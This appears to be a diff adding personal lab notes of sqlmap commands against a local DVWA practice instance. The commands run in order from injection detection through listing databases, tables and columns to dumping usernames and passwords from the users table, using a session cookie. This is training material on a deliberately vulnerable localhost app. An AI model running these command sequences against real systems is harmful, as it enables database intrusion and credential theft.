@@ -1,0 +1,37 @@
+**PHPSESSID=**aoc8skvm8svedh8lt7a5kqt1l0;security=low
+
+sqlmap -u "[http://127.0.0.1:8000/vulnerabilities/sqli/?id=1&Submit=Submit](http://127.0.0.1:8000/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" --batch
+
+
+sqlmap -u "[http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit](http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" --batch
+
+
+
+sqlmap -u "[http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit](http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" --dbs
+
+
+
+
+sqlmap -u "[http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit](http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" --batch
+
+
+('ValueError: Invalid IPv6 URL')
+
+working
+id
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" --batch
+
+List databases
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0" --dbs
+
+List tables
+
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" -D dvwa --tables
+
+list columns
+
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" -D dvwa -T users --columns
+
+dump data
+
+sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=aoc8skvm8svedh8lt7a5kqt1l0; security=low" -D dvwa -T users -C "user,password" --dump
